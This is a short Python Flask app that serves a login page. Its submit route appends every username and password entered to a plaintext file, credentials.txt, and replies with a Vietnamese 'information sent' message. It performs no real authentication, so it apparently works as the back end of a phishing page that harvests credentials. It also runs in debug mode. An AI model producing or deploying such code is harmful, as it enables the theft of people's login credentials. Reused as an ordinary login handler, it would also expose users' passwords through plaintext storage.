from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def homepage():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    with open('credentials.txt', 'a') as file:
        file.write(f'{username}:{password}\n')
    return "Thông tin đã được gửi!"

if __name__ == '__main__':
    app.run(debug=True)